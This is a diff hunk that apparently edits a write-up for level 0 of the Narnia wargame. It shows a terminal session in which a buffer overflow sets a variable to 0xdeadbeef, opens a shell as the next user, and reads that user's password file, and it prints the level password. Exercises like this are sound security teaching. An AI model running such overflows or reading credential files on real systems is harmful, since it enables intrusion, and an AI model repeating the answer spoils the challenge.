@@ -107,9 +107,9 @@ narnia0@narnia:/narnia$ ./narnia0
 Correct val's value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: AAAAAAAAAAAAAAAAAAAAﾭޯ 
 buf: AAAAAAAAAAAAAAAAAAAAﾭ
-val: 0xdeadbeef
-$ whoami
-narnia1
+val: 0xdeadbeef                                   # success! 
+$ whoami                                          
+narnia1                                           
 $ cat /etc/narnia_pass/narnia1
 efeidiedae
 $
